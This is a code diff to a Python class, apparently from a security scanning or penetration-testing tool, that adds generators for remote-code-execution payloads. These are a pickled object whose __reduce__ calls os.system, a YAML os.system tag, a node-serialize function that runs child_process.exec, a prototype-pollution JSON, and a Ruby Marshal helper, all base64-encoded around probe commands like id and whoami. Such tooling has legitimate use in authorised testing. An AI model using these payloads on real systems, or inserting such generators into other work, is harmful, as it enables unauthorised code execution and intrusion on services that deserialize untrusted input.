@@ -2,6 +2,7 @@ import subprocess
 import base64
 import os
 import re
+import pickle
 
 class PayloadMutation:
 
@@ -10,7 +11,7 @@ class PayloadMutation:
     TEST_COMMANDS = ["id", "whoami", "hostname"]
 
     JAVA_CHAIN_MAP = {
-        "CommonsCollections": [
+        "CommonsCollections": [ 
             "CommonsCollections6",
             "CommonsCollections1",
             "CommonsCollections4",
@@ -45,8 +46,16 @@ class PayloadMutation:
             return self._mutate_java_urldns()
         if self.probe == "gadget_chain":
             return self._php_mutation()
-        if self.probe in ("flip_boolean", "modify_string","modify_integer"):  
+        if self.probe in ("flip_boolean", "modify_string","modify_integer"):
             return self.__mutated_php_choose()
+        if self.probe == "pickle_exec":
+            return self._mutate_pickle()
+        if self.probe == "yaml_exec":
+            return self._mutate_yaml()
+        if self.probe in ("node_serialize", "proto_pollution"):
+            return self._mutate_nodejs()
+        if self.probe == "ruby_marshal":
+            return self._mutate_ruby()
         return []
 
 
@@ -114,6 +123,7 @@ class PayloadMutation:
             "location":          self.vector.get("location"),
             "name":              self.vector.get("name"),
             "url":               self.vector.get("url"),
+            "method":            self.vector.get("method"),
             "encoding":          "base64",
         }
 
@@ -449,5 +459,113 @@ class PayloadMutation:
             results += self._mutate_integer(origin)
         if self.probe == "modify_string":
             results += self.__modify_string(origin)
-            
+
+        return results
+
+    ## Python Pickle
+
+    PICKLE_TEST_COMMANDS = ["id", "whoami", "hostname"]
+
+    class _PickleRCE:
+        def __init__(self, command):
+            self.command = command
+
+        def __reduce__(self):
+            return (os.system, (self.command,))
+
+    def _mutate_pickle(self) -> list[dict]:
+        results = []
+        for cmd in self.PICKLE_TEST_COMMANDS:
+            try:
+                raw = pickle.dumps(self._PickleRCE(cmd))
+            except Exception:
+                continue
+            b64 = base64.b64encode(raw).decode()
+            payload = self._make_payload("pickle_rce", "os.system via __reduce__", cmd, b64)
+            payload["note"] = "Payload is a pickled object whose __reduce__ calls os.system(command)"
+            results.append(payload)
+        return results
+
+    ## YAML
+
+    YAML_TEST_COMMANDS = ["id", "whoami", "hostname"]
+
+    def _mutate_yaml(self) -> list[dict]:
+        results = []
+        for cmd in self.YAML_TEST_COMMANDS:
+            raw = (
+                "!!python/object/apply:os.system\n"
+                f"args: ['{cmd}']"
+            )
+            b64 = base64.b64encode(raw.encode()).decode()
+            payload = self._make_payload("yaml_rce", "python/object/apply:os.system", cmd, b64)
+            payload["payload_raw"] = raw
+            payload["note"] = "Requires target to use yaml.load()/yaml.unsafe_load() without SafeLoader"
+            results.append(payload)
+        return results
+
+    ## NodeJS
+
+    NODEJS_TEST_COMMANDS = ["id", "whoami", "hostname"]
+
+    def _mutate_nodejs(self) -> list[dict]:
+        results = []
+
+        if self.probe == "node_serialize":
+            for cmd in self.NODEJS_TEST_COMMANDS:
+                raw = (
+                    '{"rce":"_$$ND_FUNC$$_function(){'
+                    f"require('child_process').exec('{cmd}');"
+                    '}()"}'
+                )
+                b64 = base64.b64encode(raw.encode()).decode()
+                payload = self._make_payload("node_serialize_rce", "node-serialize IIFE", cmd, b64)
+                payload["payload_raw"] = raw
+                payload["note"] = "Requires target to call node-serialize's unserialize() on this JSON"
+                results.append(payload)
+            return results
+
+        # proto_pollution
+        raw = '{"__proto__": {"isAdmin": true, "polluted": true}}'
+        b64 = base64.b64encode(raw.encode()).decode()
+        payload = self._make_payload("prototype_pollution", "__proto__ injection", None, b64)
+        payload["payload_raw"] = raw
+        payload["note"] = "Merge/clone of this JSON into an object may pollute Object.prototype"
+        results.append(payload)
+        return results
+
+    ## Ruby Marshal
+
+    RUBY_TEST_COMMANDS = ["id", "whoami", "hostname"]
+
+    def _mutate_ruby(self) -> list[dict]:
+        results = []
+        for cmd in self.RUBY_TEST_COMMANDS:
+            ruby_script = (
+                "require 'base64'; "
+                "puts Base64.strict_encode64(Marshal.dump("
+                f"Object.new.tap {{ |o| o.instance_variable_set(:@cmd, {cmd!r}) }}"
+                "))"
+            )
+            try:
+                result = subprocess.run(
+                    ["ruby", "-e", ruby_script],
+                    capture_output=True, text=True, timeout=15,
+                )
+            except (subprocess.TimeoutExpired, FileNotFoundError):
+                results.append({
+                    "error": "ruby not found or timed out",
+                    "hint": "Install Ruby and ensure 'ruby' is on PATH to generate Marshal payloads",
+                    "command": f"ruby -e \"puts Base64.strict_encode64(Marshal.dump(...))\"",
+                })
+                continue
+
+            if result.returncode != 0 or not result.stdout.strip():
+                continue
+
+            b64 = result.stdout.strip()
+            payload = self._make_payload("ruby_marshal", "Marshal.dump helper", cmd, b64)
+            payload["note"] = "Generic Marshal object — replace with a real gadget chain for the target Ruby framework"
+            results.append(payload)
+
         return results
